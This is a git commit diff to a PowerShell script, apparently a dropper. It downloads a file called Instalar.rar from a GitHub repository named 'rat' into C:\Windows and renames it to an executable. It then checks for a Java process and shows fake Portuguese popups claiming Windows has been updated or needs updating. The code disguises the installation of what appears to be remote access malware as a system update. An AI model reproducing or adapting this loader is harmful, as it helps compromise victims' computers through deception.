093f0887c3257e95bb8149bc251f3c9b8e3fb070
itarare <36075548+itarare@users.noreply.github.com>
2018-02-06 10:14:08 -0200

    Update instala.ps1

--- instala.ps1
+++ instala.ps1
@@ -2,6 +2,14 @@
 cd\
 cd c:\windows
 
+$fs = 'c:\windows\Instalar.rar'
+if (Test-Path $fs) {
+  try {	
+     Remove-Item $fs -recurse
+  } Catch {
+  }
+}
+
 $url = "https://raw.githubusercontent.com/itarare/rat/master/Instalar.rar"
 $output = "c:\windows\Instalar.rar"
 $start_time = Get-Date
@@ -9,9 +17,8 @@ $start_time = Get-Date
 Invoke-WebRequest -Uri $url -OutFile $output
 Write-Output "[ $((Get-Date).Subtract($start_time).Seconds) ]"
 
-$fs = 'c:\windows\Instalar.rar'
 if (Test-Path $fs) {
-	rename-item -path c:\windows\Instalar.rar -newname c:\windows\Instalar.exe   
+   rename-item -path c:\windows\Instalar.rar -newname c:\windows\Instalar.exe   
    Start-Sleep -s 1
 
    $fs = 'c:\windows\Instalar.exe'
@@ -20,13 +27,13 @@ if (Test-Path $fs) {
 
       $r2 = Get-Process Java -ErrorAction SilentlyContinue
       if ($r2) { 
-         $wshell.Popup("Windows atualizado.", 0, "Atenção !", 0x0)
+         $wshell.Popup("Windows atualizado.", 0, "AtenÃ§Ã£o !", 0x0)
       } else {
-         $wshell.Popup("Atualize o Windows 0x03.", 0, "Atenção !", 0x0)
+         $wshell.Popup("Atualize o Windows 0x03.", 0, "AtenÃ§Ã£o !", 0x0)
       }
    } else {
-      $wshell.Popup("Atualize o Windows 0x02.", 0, "Atenção !", 0x0)
+      $wshell.Popup("Atualize o Windows 0x02.", 0, "AtenÃ§Ã£o !", 0x0)
    }
 } else {
-   $wshell.Popup("Atualize o Windows 0x01.", 0, "Atenção !", 0x0)  
+   $wshell.Popup("Atualize o Windows 0x01.", 0, "AtenÃ§Ã£o !", 0x0)  
 }
